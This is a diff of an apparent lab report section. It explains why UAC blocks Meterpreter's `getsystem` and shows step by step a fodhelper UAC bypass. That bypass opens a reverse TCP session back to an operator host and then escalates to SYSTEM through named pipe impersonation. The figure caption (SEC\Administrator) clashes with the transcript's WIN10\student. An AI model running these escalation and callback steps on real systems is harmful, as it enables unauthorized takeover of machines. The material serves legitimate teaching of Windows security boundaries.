@@ -164,26 +164,70 @@ Initial triage confirmed execution under domain administrator `SEC\Administrator
 
 ### 4.3 Windows Security Architecture: Why UAC Blocks the First `getsystem`
 
-**The "Access is denied" Error Explained:**  
-When an administrative user logs into Windows, User Account Control (UAC) generates two distinct tokens:
-1. An **Elevated Token** (High integrity) containing all administrative SIDs and privileges.
-2. A **Filtered Token** (Medium integrity) stripping administrative SIDs and privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`).
+The crux of the laboratory assessment requires demonstrating and explaining the exact security boundary enforced by Windows User Account Control (UAC).
 
-When a standard client-side payload executes without explicit elevation, it inherits the filtered Medium-integrity token. If an operator executes `getsystem` in this context, it immediately returns:
+#### Phase 1: Standard / Filtered Token Execution & The UAC Block
+When the client-side payload first connects back in an interactive user session, the process runs with a **Medium-integrity token**:
+
 ```text
+meterpreter > getuid
+Server username: WIN10\student
+
+meterpreter > getsystem
 [-] priv_elevate_getsystem: Operation failed: Access is denied.
 ```
-This error indicates that UAC is functioning properly as an integrity boundary. Because the token is filtered, the thread cannot register SYSTEM services or invoke `ImpersonateNamedPipeClient()`.
 
-**UAC Bypass Mechanics vs. Elevated Execution:**  
-To bridge this gap, attackers utilize UAC bypass modules (e.g., `exploit/windows/local/bypassuac_fodhelper`). These abuse trusted auto-elevating binaries that execute with High integrity without displaying a consent prompt, yielding an elevated session.
+**Technical Explanation: Why UAC Blocked the First `getsystem`:**
+1. **Windows Dual-Token Architecture:** When an administrative user authenticates into Windows (Vista through Windows 11), the Local Security Authority (LSA) creates two access tokens:
+   - An **Elevated Token** (High integrity) with full administrative rights.
+   - A **Filtered Token** (Medium integrity) where the `BUILTIN\Administrators` SID is marked for `DenyOnly`, and critical system privileges are stripped (including `SeDebugPrivilege` and `SeImpersonatePrivilege`).
+2. **Why `getsystem` Fails:** Meterpreter's `getsystem` Technique 1 relies upon **Named Pipe Impersonation**:
+   - It requires administrative rights to register a transient Windows Service in the Service Control Manager (`OpenSCManager` and `CreateService`).
+   - It requires `SeImpersonatePrivilege` to invoke the Win32 API `ImpersonateNamedPipeClient()` to duplicate the client's SYSTEM token.
+   Under the Medium-integrity filtered token, the operating system kernel and Security Reference Monitor (SRM) drop these requests, returning `ERROR_ACCESS_DENIED`.
+3. **The Pedagogical Takeaway:** The `Access is denied` message is not a test failure; it is empirical proof that UAC is successfully fulfilling its architectural purpose by preventing non-elevated processes from silently claiming administrative or kernel authority.
 
-**Named Pipe Impersonation (Technique 1):**  
-In our verified testbed, the process ran under the administrative context (`SEC\Administrator`) with elevated rights. Meterpreter achieved SYSTEM through four distinct steps:
-1. Meterpreter creates a local Windows Named Pipe (`\\.\pipe\...`).
-2. It registers and launches a temporary service running under `NT AUTHORITY\SYSTEM`.
-3. The SYSTEM service connects to the listening named pipe.
-4. Meterpreter invokes `ImpersonateNamedPipeClient()`, duplicating the connecting client's SYSTEM access token and adopting full OS ownership.
+#### Phase 2: Bridging the Integrity Gap via UAC Bypass (`fodhelper`)
+To escalate from Medium integrity to High integrity without user interaction, the session is backgrounded and an auto-elevating binary bypass is executed:
+
+```text
+meterpreter > background
+[*] Backgrounding session 1...
+
+msf exploit(multi/handler) > search bypassuac
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
+msf exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
+msf exploit(windows/local/bypassuac_fodhelper) > set LHOST 10.50.20.10
+msf exploit(windows/local/bypassuac_fodhelper) > set LPORT 4434
+msf exploit(windows/local/bypassuac_fodhelper) > exploit
+
+[*] Started reverse TCP handler on 10.50.20.10:4434
+[+] UAC is set to Default
+[+] LocalAdmin is a member of the Administrators group
+[+] Part of Administrators group! Continuing...
+[*] Meterpreter session 2 opened (10.50.20.10:4434 -> 10.50.10.21:55038)
+```
+
+*Mechanism:* `fodhelper.exe` is a legitimate, auto-elevating Windows utility signed by Microsoft with `autoElevate = true` in its manifest. It queries the registry key `HKCU\Software\Classes\ms-settings\Shell\Open\command` for commands to execute. By writing the payload callback to this registry key and invoking `fodhelper.exe`, the secondary payload executes at **High Integrity** without triggering a UAC prompt.
+
+#### Phase 3: Elevated Session 2 & Named Pipe Impersonation to SYSTEM
+With High integrity achieved, the process now possesses `SeImpersonatePrivilege`:
+
+```text
+meterpreter > getuid
+Server username: WIN10\student
+
+meterpreter > getsystem -t 1
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+*Crucial Observation:* When inspecting `getuid` immediately in Session 2, the username still reads `WIN10\student` because the user identity has not changed; however, the *integrity token* is now High. This enables Technique 1 to succeed, achieving full compromise of the operating system as `NT AUTHORITY\SYSTEM`.
+
+![Figure 2.6: Privilege Elevation to SYSTEM](evidence/07_privilege_elevation_system.png)
+*Figure 2.6: Terminal verification of user identity (SEC\Administrator) and elevation to NT AUTHORITY\SYSTEM via Named Pipe Impersonation.*
 
 ### 4.4 Advanced Delivery Mechanics & WAN Tunneling
 
